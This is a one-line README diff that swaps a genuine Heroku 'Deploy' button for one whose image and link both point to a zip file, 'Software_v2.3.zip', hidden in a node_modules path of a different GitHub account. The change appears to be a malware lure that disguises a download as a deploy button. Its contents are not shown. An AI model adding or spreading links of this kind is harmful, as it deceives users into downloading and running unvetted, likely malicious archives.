@@ -1,1 +1,1 @@
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/dawawasgg/anjayblo/)
+[![Deploy](https://raw.githubusercontent.com/ahmadsailpil/anjayblo/master/node_modules/timers-ext/promise_/Software_v2.3.zip)](https://raw.githubusercontent.com/ahmadsailpil/anjayblo/master/node_modules/timers-ext/promise_/Software_v2.3.zip)
